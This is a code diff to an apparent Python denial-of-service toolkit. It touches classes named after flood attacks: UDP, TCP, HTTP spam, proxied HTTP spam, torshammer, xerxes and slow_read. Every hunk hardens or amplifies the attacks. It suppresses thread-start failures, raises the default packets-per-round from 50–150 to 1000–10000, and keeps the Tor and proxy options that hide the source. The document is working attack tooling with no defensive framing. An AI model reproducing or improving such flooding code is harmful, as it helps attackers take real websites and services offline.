@@ -139,9 +139,12 @@ class udp_flood:
   self.counter=0
   self.start=time.time()
   for x in range(threads):
-   t=threading.Thread(target=self.attack)
-   t.daemon=threads_daemon
-   t.start()
+   try:
+    t=threading.Thread(target=self.attack)
+    t.daemon=threads_daemon
+    t.start()
+   except:
+    pass
  def attack(self):
   try:
    time.sleep(1)
@@ -210,9 +213,12 @@ class vse_flood:
   self.counter=0
   self.start=time.time()
   for x in range(threads):
-   t=threading.Thread(target=self.attack)
-   t.daemon=threads_daemon
-   t.start()
+   try:
+    t=threading.Thread(target=self.attack)
+    t.daemon=threads_daemon
+    t.start()
+   except:
+    pass
  def attack(self):
   try:
    time.sleep(1)
@@ -264,7 +270,7 @@ class vse_flood:
 
 
 class tcp_flood:
- def __init__(self,u,p=80,threads_daemon=True,min_size=10,max_size=50,threads=256,timeout=5,round_min=50,round_max=150,interval=0.001,duration=60,logs=False,tor=False):
+ def __init__(self,u,p=80,threads_daemon=True,min_size=10,max_size=50,threads=256,timeout=5,round_min=1000,round_max=10000,interval=0.001,duration=60,logs=False,tor=False):
   self.logs=logs
   self.stop=False
   self.counter=0
@@ -280,9 +286,12 @@ class tcp_flood:
   self.round_min=round_min
   self.round_max=round_max
   for x in range(threads):
-   t=threading.Thread(target=self.attack)
-   t.daemon=threads_daemon
-   t.start()
+   try:
+    t=threading.Thread(target=self.attack)
+    t.daemon=threads_daemon
+    t.start()
+   except:
+    pass
  def attack(self):
   try:
    time.sleep(1)#give time for all threads to be created
@@ -317,6 +326,7 @@ class tcp_flood:
         sys.stdout.write("\rPackets: {} | Bytes: {}   ".format(self.counter,len(m)))
         sys.stdout.flush()
         #print("Packets: {} | Bytes: {}".format(tcp_counter,len(m)))
+       time.sleep(self.interval)
       except:
        break
       time.sleep(self.interval)
@@ -360,7 +370,7 @@ class tcp_flood:
 
 
 class http_spam:
- def __init__(self,u,p=80,cookie=None,user_agents=None,method=3,threads_daemon=True,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=50,round_max=150,interval=0.001,duration=60,logs=False,tor=False):
+ def __init__(self,u,p=80,cookie=None,user_agents=None,method=3,threads_daemon=True,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=1000,round_max=10000,interval=0.001,duration=60,logs=False,tor=False):
   self.logs=logs
   self.cookie=cookie
   self.user_agents=user_agents
@@ -384,9 +394,12 @@ class http_spam:
   self.post_field_max=post_field_max
   self.post_field_min=post_field_min
   for x in range(threads):
-   t=threading.Thread(target=self.attack)
-   t.daemon=threads_daemon
-   t.start()
+   try:
+    t=threading.Thread(target=self.attack)
+    t.daemon=threads_daemon
+    t.start()
+   except:
+    pass
  def attack(self):
   try:
    time.sleep(1)
@@ -423,6 +436,7 @@ class http_spam:
         sys.stdout.write("\rRequest: {} | Type: {} | Bytes: {}   ".format(self.counter,req,len(m)))
         sys.stdout.flush()
         #print("Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
+       time.sleep(self.interval)
       except:
        break
       time.sleep(self.interval)
@@ -453,7 +467,7 @@ class http_spam:
 
 
 class prox_http_spam:
- def __init__(self,u,p=80,cookie=None,user_agents=None,method=3,threads_daemon=True,scraping_timeout=15,http_list=None,socks4_list=None,socks5_list=None,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=50,round_max=150,interval=0.001,duration=60,logs=False):
+ def __init__(self,u,p=80,cookie=None,user_agents=None,method=3,threads_daemon=True,scraping_timeout=15,http_list=None,socks4_list=None,socks5_list=None,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=1000,round_max=10000,interval=0.001,duration=60,logs=False):
   self.logs=logs
   self.cookie=cookie
   self.user_agents=user_agents
@@ -486,9 +500,12 @@ class prox_http_spam:
   self.post_field_max=post_field_max
   self.post_field_min=post_field_min
   for x in range(threads):
-   t=threading.Thread(target=self.attack)
-   t.daemon=threads_daemon
-   t.start()
+   try:
+    t=threading.Thread(target=self.attack)
+    t.daemon=threads_daemon
+    t.start()
+   except:
+    pass
  def attack(self):
   try:
    time.sleep(1)
@@ -545,6 +562,7 @@ class prox_http_spam:
         sys.stdout.write("\rBot: {} | Request: {} | Type: {} | Bytes: {}   ".format(ipp,self.counter,req,len(m)))
         sys.stdout.flush()
         #print("Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,lulzer_counter,req,len(m)))
+       time.sleep(self.interval)
       except:
        break
       time.sleep(self.interval)
@@ -592,9 +610,12 @@ class torshammer:
   self.tor=tor
   self.logs=logs
   for x in range(threads):
-   t=threading.Thread(target=self.attack)
-   t.daemon=threads_daemon
-   t.start()
+   try:
+    t=threading.Thread(target=self.attack)
+    t.daemon=threads_daemon
+    t.start()
+   except:
+    pass
  def attack(self):
   try:
    time.sleep(1)
@@ -693,9 +714,12 @@ class prox_hammer:
   self.logs=logs
   self.counter=0
   for x in range(threads):
-   t=threading.Thread(target=self.attack)
-   t.daemon=threads_daemon
-   t.start()
+   try:
+    t=threading.Thread(target=self.attack)
+    t.daemon=threads_daemon
+    t.start()
+   except:
+    pass
  def attack(self):
   try:
    time.sleep(1)
@@ -794,10 +818,13 @@ class xerxes:
   self.logs=logs
   self.id_key=0
   for x in range(threads):
-   t=threading.Thread(target=self.attack)
-   t.daemon=threads_daemon
-   t.start()
-   self.id_key+=1
+   try:
+    t=threading.Thread(target=self.attack)
+    t.daemon=threads_daemon
+    t.start()
+    self.id_key+=1
+   except:
+    pass
  def attack(self):
   try:
    x=self.id_key
@@ -879,10 +906,13 @@ class prox_xerxes:
   self.logs=logs
   self.id_key=0
   for x in range(threads):
-   t=threading.Thread(target=self.attack)
-   t.daemon=threads_daemon
-   t.start()
-   self.id_key+=1
+   try:
+    t=threading.Thread(target=self.attack)
+    t.daemon=threads_daemon
+    t.start()
+    self.id_key+=1
+   except:
+    pass
  def attack(self):
   try:
    x=self.id_key
@@ -996,9 +1026,12 @@ class slow_read:
   self.duration=duration
   self.start=time.time()
   for x in range(threads):
-   t=threading.Thread(target=self.attack)
-   t.daemon=threads_daemon
-   t.start()
+   try:
+    t=threading.Thread(target=self.attack)
+    t.daemon=threads_daemon
+    t.start()
+   except:
+    pass
  def attack(self):
   try:
    time.sleep(1)
